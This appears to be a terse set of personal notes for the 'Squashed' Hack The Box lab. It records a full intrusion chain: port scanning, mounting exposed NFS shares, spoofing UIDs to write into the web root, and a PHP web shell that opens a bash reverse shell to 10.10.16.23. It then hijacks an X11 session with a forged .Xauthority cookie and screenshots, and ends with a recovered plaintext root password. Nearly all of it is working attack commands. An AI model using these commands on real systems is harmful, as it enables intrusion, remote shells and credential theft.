@@ -1,0 +1,180 @@
+└─$ naabu -host 10.10.11.191 --nmap-cli "nmap -sCV -Pn"
+
+                  __
+  ___  ___  ___ _/ /  __ __
+ / _ \/ _ \/ _ \/ _ \/ // /
+/_//_/\_,_/\_,_/_.__/\_,_/ v2.0.6
+
+                projectdiscovery.io
+
+Use with caution. You are responsible for your actions
+Developers assume no liability and are not responsible for any misuse or damage.
+[INF] Running CONNECT scan with non root privileges
+[INF] Found 4 ports on host 10.10.11.191 (10.10.11.191)
+10.10.11.191:22
+10.10.11.191:111
+10.10.11.191:2049
+10.10.11.191:80
+[INF] Running nmap command: nmap -sCV -Pn -p 2049,80,22,111 10.10.11.191
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 12:04 +07
+Nmap scan report for squashed.htb (10.10.11.191)
+Host is up (0.072s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Built Better
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      38571/tcp6  mountd
+|   100005  1,2,3      44776/udp6  mountd
+|   100005  1,2,3      44789/tcp   mountd
+|   100005  1,2,3      45852/udp   mountd
+|   100021  1,3,4      37605/tcp   nlockmgr
+|   100021  1,3,4      38431/tcp6  nlockmgr
+|   100021  1,3,4      42799/udp6  nlockmgr
+|   100021  1,3,4      53504/udp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+2049/tcp open  nfs_acl 3 (RPC #100227)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
+
+
+
+┌──(anhndt㉿Laptop14)-[~/htb/squashed.htb]
+└─$ showmount -e 10.10.11.191
+Export list for 10.10.11.191:
+/home/ross    *
+/var/www/html *
+
+
+
+┌──(kali㉿kali)-[~/stuffs/htb/squashed.htb]
+└─$ sudo mount -t nfs 10.10.11.191:/home/ross ./ross -o nolock
+
+┌──(kali㉿kali)-[~/stuffs/htb/squashed.htb]
+└─$ sudo mount -t nfs 10.10.11.191:/var/www/html ./html -o nolock
+
+
+┌──(kali㉿kali)-[~/stuffs/htb/squashed.htb]
+└─$ ls -al ross
+total 68
+drwxr-xr-x 14 1001 1001 4096 Apr  4 01:21 .
+drwxr-xr-x  4 kali kali 4096 Apr  4 04:34 ..
+lrwxrwxrwx  1 root root    9 Oct 20 09:24 .bash_history -> /dev/null
+drwx------ 11 1001 1001 4096 Oct 21 10:57 .cache
+drwx------ 12 1001 1001 4096 Oct 21 10:57 .config
+drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Desktop
+drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Documents
+drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Downloads
+drwx------  3 1001 1001 4096 Oct 21 10:57 .gnupg
+drwx------  3 1001 1001 4096 Oct 21 10:57 .local
+drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Music
+drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Pictures
+drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Public
+drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Templates
+drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Videos
+lrwxrwxrwx  1 root root    9 Oct 21 09:07 .viminfo -> /dev/null
+-rw-------  1 1001 1001   57 Apr  4 01:21 .Xauthority
+-rw-------  1 1001 1001 2475 Apr  4 01:21 .xsession-errors
+-rw-------  1 1001 1001 2475 Dec 27 10:33 .xsession-errors.old
+
+
+┌──(kali㉿kali)-[~/stuffs/htb/squashed.htb/html]
+└─$ ls -al
+total 56
+drwxrwxrwx 5 2017 www-data  4096 Apr  4 04:35 .
+drwxr-xr-x 4 kali kali      4096 Apr  4 04:34 ..
+drwxr-xr-x 2 2017 www-data  4096 Apr  4 04:35 css
+-rw-r--r-- 1 2017 www-data    44 Oct 21 06:30 .htaccess
+drwxr-xr-x 2 2017 www-data  4096 Apr  4 04:35 images
+-rw-r----- 1 2017 www-data 32532 Apr  4 04:35 index.html
+drwxr-xr-x 2 2017 www-data  4096 Apr  4 04:35 js
+
+sudo adduser anhndt
+sudo usermod -u 1001 kali
+
+sudo usermod -a -G www-data anhndt
+
+
+
+echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.23/7050 0>&1'\");" > shell.php
+
+http://squashed.htb/shell.php
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+
+
+find / -perm +r
+
+
+/usr/bin/keepassxc --pw-stdin --keyfile /usr/share/keepassxc/keyfiles/ross/keyfile.key /usr/share/keepassxc/databases/ross/Passwords.kdbx
+
+find / -type f -name "*.key"
+
+
+sudo -H -u ross bash -c "whoami"
+
+
+
+https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11
+
+
+xdpyinfo -display 10.10.11.191:0
+
+
+echo -n "AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABAuWP2Z+/upvNlBOWceAAKX" | base64 -d > .Xauthority
+
+
+export XAUTHORITY=/tmp/.Xauthority
+export HOME=/home/alex => write-up say so ??? but i don't need this
+
+xdpyinfo -display :0
+xwininfo -root -tree -display :0
+
+
+XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0
+
+
+xwd -root -screen -silent -display :0 > screenshot.xwd
+
+convert screenshot.xwd screenshot.png
+
+
+root
+cah$mei7rai9A
+
+
+
+
+
+
+
+
+
+
+
+
+
